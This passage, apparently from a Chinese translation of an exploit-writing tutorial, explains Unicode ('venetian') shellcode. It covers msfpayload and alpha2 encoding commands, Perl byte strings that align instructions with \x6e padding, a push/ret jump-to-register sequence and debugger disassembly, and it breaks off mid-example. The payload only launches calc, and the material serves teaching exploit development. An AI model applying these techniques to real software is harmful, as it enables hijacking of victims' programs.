3.alpha2(SkyLined)
下载地址：http://packetstormsecurity.org/shellcode/alpha2.tar.gz
（译注：这里提供的是一份C源码，得用gcc才能编译，若想用VC的话，可以下载经幻影旅团改良的alpha2：
http://secinn.appspot.com/pstzine/read?issue=1&articleid=2）
著名的alpha2编码器（同时也包含在metasploit等其它工具之中）将会把原始shellocde包裹在decoder之中（这
点与vense.pl很相似），但其存在以下优点：
● 你只需要一个指向shellcode入口的寄存器，而无需指向可写可执行地址的寄存器。
● decoder并不包含在原始代码中，decoder可自我修改，而且要求的缓冲区空间也比较小。
（其文档中描述道：“decoder 将更改自身代码以突破 alphanumeric 代码的限制，它会循环创建一个 decoder 以
从编码数据中解码出原始shellcode。接着用解码后的shellcode覆盖掉编码数据，并执行它。因此其所运行的内
存需要有读写及执行权限，并且需要知道其内存地址。）
它的使用方法：
1. 用msfpayload生成raw shellcode；
2. 用alpha2将raw shellcode转换成unicode字符串：
root@bt4:/# cd pentest
root@bt4:/pentest# cd exploits/
root@bt4:/pentest/exploits# cd framework3
./msfpayload windows/exec CMD=calc R > /pentest/exploits/runcalc.raw
root@bt4:/pentest/exploits/framework3# cd ..
root@bt4:/pentest/exploits# cd alpha2
./alpha2 eax --unicode --uppercase 在eax上放置下列代码：\xbb\x66\x55\x44\x33\xff\xe3，然后用”jump eax”覆盖EIP。
但现在面对unicode，很显然这无法正常执行。我们先来看一下开头的指令，”mov ebx” = 0xbb，后面跟着欲放
入ebx的数据。这个参数需要为00nn00mm格式，你可使用mov ebx,33005500这样的指令，其对应的机器码为：
bb00550033 #mov ebx,33005500h
因此本例写入 eax 的字节为\xbb\x55\x33，Unicode 会向其插入 null，最后转换成\xbb\x00\x55\x00\x33，这就是
我们实际需要的指令。对于加减指令也可使用相同的技术。你可以使用inc,dec指令来更改寄存器或者堆栈位置。
在 Phrack 上 的 文 章 Building IA32 'Unicode-Proof' Shellcodes
（http://www.phrack.org/issues.html?issue=61&id=11#article ）中就给出在指定寄存器放置地址的整个系列指令。
返回到我们例子，我们若想向eax写入0x33445566，可以这样做：
mov eax,0xAA004400 ; set EAX to 0xAA004400
push eax
dec esp
pop eax ; EAX = 0x004400??
add eax,0x33005500 ; EAX = 0x334455??
mov al,0x0 ; EAX = 0x33445500
mov ecx,0xAA006600
add al,ch ; EAX now contains 0x33445566
转换成机器码为：
b8004400aa mov eax,0AA004400h
50 push eax
4c dec esp
58 pop eax
0500550033 add eax,33005500h
b000 mov al,0
b9006600aa mov ecx,0AA006600h
00e8 add al,ch
接着看下一问题。冒似mov 和add指令可以正常地转换为unicode了，但如果是单字节机器码呢？如果null字
节插在它们之间，那么指令将再次无法正常运行。比如下列payload字符串：
\xb8\x44\xaa\x50\x4c\x58\x05\x55\x33\xb0\xb9\x66\xaa\xe8
或者perl上的：
my $align="\xb8\x44\xaa"; #mov eax,0AA004400h
$align=$align."\x50"; #push eax
$align=$align."\x4c"; #dec esp
$align=$align."\x58"; #pop eax
$align = $align."\x05\x55\x33"; #add eax,33005500h
$align=$align."\xb0"; #mov al,0
$align=$align."\xb9\x66\xaa"; #mov ecx,0AA0660h
$align=$align."\xe8"; #add al,ch
当我们在调试器上查看此段代码时，会发现它们被转换成了下列指令：
0012f2b4 b8004400aa mov eax,0AA004400h
0012f2b9 005000 add byte ptr [eax],dl
0012f2bc 4c dec esp
0012f2bd 005800 add byte ptr [eax],bl
0012f2c0 0500550033 add eax,offset+0x330054ff(33005500)
0012f2c5 00b000b90066 add byte ptr [eax+6600B900h],dh
0012f2cb 00aa00e80050 add byte ptr [edx+5000E800h],ch
看来相当混乱，第一条指令还正常，但第二条指令之后就全变了。因此我们需要找到一种方法，以确保“push
eax,dec esp,pop eax”以正确的方式被中断。最佳方法就是插入一些安全指令（类似NOPs的指令），这样既能对
齐null字节，又不会破坏寄存器或指令。缩短差距，以确保null和指令以正确的方式对齐，这也是这项技术称
为venetian shellcode的原因所在。
在这种情况下，我们需要找到一个可以“吃掉”null 字节的指令，可以通过下列机器码来解决这个问题（依赖
于包含可写地址的寄存器）：
00 6E 00:add byte ptr [esi],ch
00 6F 00:add byte ptr [edi],ch
00 70 00:add byte ptr [eax],dh
00 71 00:add byte ptr [ecx],dh
00 72 00:add byte ptr [edx],dh
00 73 00:add byte ptr [ebx],dh
（62，6d也可使用——相当有创意，看看它们可以做什么）
假设esi指向可写地址（不要认为可以向该地址写入任意内容），然后在两指令之间使用\x6e，以对齐null字节。
例如：
my $align="\xb8\x44\xaa"; #mov eax,0AA004400h
$align=$align."\x6e"; #nop/align null bytes
$align=$align."\x50"; #push eax
$align=$align."\x6e"; #nop/align null bytes
$align=$align."\x4c"; #dec esp
$align=$align."\x6e"; #nop/align null bytes
$align=$align."\x58"; #pop eax
$align=$align."\x6e"; #nop/align null bytes
$align = $align."\x05\x55\x33"; #add eax,33005500h
$align=$align."\x6e"; #nop/align null bytes
$align=$align."\xb0"; #mov al,0
#no alignment needed between these 2 !
$align=$align."\xb9\x66\xaa"; #mov ecx,0AA0660h
$align=$align."\x6e"; #nop/align null bytes
在调试器上可以看到指令被转换成：
0012f2b4 b8004400aa mov eax,0AA004400h
0012f2b9 006e00 add byte ptr [esi],ch
0012f2bc 50 push eax
0012f2bd 006e00 add byte ptr [esi],ch
0012f2c0 4c dec esp
0012f2c1 006e00 add byte ptr [esi],ch
0012f2c4 58 pop eax
0012f2c5 006e00 add byte ptr [esi],ch
0012f2c8 0500550033 add eax,offset +0x330054ff (33005500)
0012f2cd 006e00 add byte ptr [esi],ch
0012f2d0 b000 mov al,0
0012f2d2 b9006600aa mov ecx,0AA006600h
0012f2d7 006e00 add byte ptr [esi],ch
=>很好，正如你所看到的，我们不得不玩一玩这小把戏，将\x6e放在每两条指令之间，并不能保证没问题，你
还需要再测试其效果，并根据需要做出相应调整。基于此，我们还需要想方设法将地址写入 eax。现在我们需
要做的就是跳转到这地址上，为此，还需要几行venetian code。跳转到eax最简单的方法就是先向栈中压入eax，
然后返回（push eax,ret）。对应的机器码为：
50 ;push eax
c3 ;ret
（C3应该会被转换成C300）
在venetian code上为\x50\x6e\xc3。这样我们就完成了下列工作：
● 用可用指令地址覆盖EIP；
● 向某寄存器中写入一些代码；
● 跳转到寄存器。
如果寄存器包含的是ASCII shellcode，它将会执行失败。
注意1：当然，硬编码地址并不提倡。如果你能使用基于某寄存器数值的偏移量自然更好，然后使用add和sub
指令去寻求寄存器偏移地址，进而达到期望的地址。
注意2：如果指令没有被正确转换，你就得使用其它unicode转换方式（可能是language & regional options导致
的），这对于是否可利用成功起着关键性作用。查看 FX 的转换表，看是否可找到其它字节，当转换成 unicode
时，可以实现你所期望的条件。例如：0xc3没有转换成0xc3 0x00，那么你可以看看unicode转换是否是使用了
OEM code page。在上面这种情况下，0xc7会被转换成0xc3 0x00，这可以帮助你编写出正确的exploit。
Example 2：
假设你想将ebp+300的地址放入eax中（之后你得能够跳到eax去执行代码），那么就需要先写入一些汇编指令，
然后使用venetian shellcode技术，后面再以转换成unicode的代码收尾。将ebp+300h写入eax的汇编指令如下：
push ebp ; put the address at ebp on the stack
pop eax ; get address of ebp back from the stack and put it in eax
add eax,11001400 ; add 11001400 to eax
sub eax,11001100 ; subtract 11001100 from eax. Result = eax+300
对应的机器码为：
55 push ebp
58 pop eax
0500140011 add eax,offset XXXX+0x1400 (11001400)
2d00110011 sub eax,offset XXXX+0x1100 (11001100)
为了利用venetian shellcode技术，字符串需要这样发送：
my $align="\x55"; #push ebp
$align=$align."\x6e"; #align
$align=$align."\x58"; #pop eax
$align=$align."\x6e"; #align
$align=$align."\x05\x14\x11"; #add eax,0x11001400
$align=$align."\x6e"; #align
$align=$align."\x2d\x11\x11"; #sub eax,0x11001100
$align=$align."\x6e"; #align
在调试器中的反汇编代码如下：
0012f2b4 55 push ebp
0012f2b5 006e00 add byte ptr [esi],ch
0012f2b8 58 pop eax
0012f2b9 006e00 add byte ptr [esi],ch